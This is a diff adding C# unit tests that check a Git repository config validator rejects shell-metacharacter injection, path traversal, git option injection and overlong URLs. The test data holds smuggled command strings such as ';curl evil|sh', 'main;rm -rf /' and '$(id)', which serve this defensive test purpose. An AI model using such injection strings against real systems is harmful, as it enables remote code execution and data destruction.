@@ -148,7 +148,9 @@ public class GitRepositoryValidatorTests
             TargetPath = "/workspace\\..\\..\\etc"
         };
         var errors = GitRepositoryValidator.Validate(config);
-        errors.Should().ContainSingle().Which.Should().Contain("path traversal");
+        // Backslash is both a path-traversal hint and a shell metacharacter, so
+        // both rules fire. Either is sufficient to block the request.
+        errors.Should().Contain(e => e.Contains("path traversal"));
     }
 
     [Fact]
@@ -240,6 +242,63 @@ public class GitRepositoryValidatorTests
         errors.Should().HaveCount(2);
         errors[0].Should().StartWith("Repository [1]:");
         errors[1].Should().StartWith("Repository [2]:");
+    }
+
+    [Theory]
+    [InlineData("https://github.com/owner/repo.git;curl evil")]
+    [InlineData("https://github.com/owner/repo.git`id`")]
+    [InlineData("https://github.com/owner/repo.git$(id)")]
+    [InlineData("https://github.com/owner/repo.git|sh")]
+    [InlineData("https://github.com/owner/repo.git&whoami")]
+    [InlineData("git@host:/tmp';curl evil|sh;'")]
+    public void Validate_UrlWithShellMetacharacters_ShouldBeRejected(string maliciousUrl)
+    {
+        var config = new GitRepositoryConfig { Url = maliciousUrl };
+        var errors = GitRepositoryValidator.Validate(config);
+        errors.Should().Contain(e => e.Contains("not allowed"));
+    }
+
+    [Theory]
+    [InlineData("main;rm -rf /")]
+    [InlineData("main$(id)")]
+    [InlineData("main`id`")]
+    [InlineData("main|sh")]
+    [InlineData("-uupload-pack=foo")]
+    public void Validate_BranchWithShellMetacharactersOrLeadingDash_ShouldBeRejected(string maliciousBranch)
+    {
+        var config = new GitRepositoryConfig
+        {
+            Url = "https://github.com/owner/repo.git",
+            Branch = maliciousBranch
+        };
+        var errors = GitRepositoryValidator.Validate(config);
+        errors.Should().Contain(e => e.Contains("Invalid branch"));
+    }
+
+    [Theory]
+    [InlineData("/workspace/repo;rm -rf /")]
+    [InlineData("/workspace/$(id)")]
+    [InlineData("/workspace/`whoami`")]
+    public void Validate_TargetPathWithShellMetacharacters_ShouldBeRejected(string maliciousPath)
+    {
+        var config = new GitRepositoryConfig
+        {
+            Url = "https://github.com/owner/repo.git",
+            TargetPath = maliciousPath
+        };
+        var errors = GitRepositoryValidator.Validate(config);
+        errors.Should().Contain(e => e.Contains("not allowed"));
+    }
+
+    [Fact]
+    public void Validate_UrlExceedingMaxLength_ShouldBeRejected()
+    {
+        var config = new GitRepositoryConfig
+        {
+            Url = "https://github.com/" + new string('a', 3000) + "/repo.git"
+        };
+        var errors = GitRepositoryValidator.Validate(config);
+        errors.Should().Contain(e => e.Contains("maximum length"));
     }
 
     [Fact]
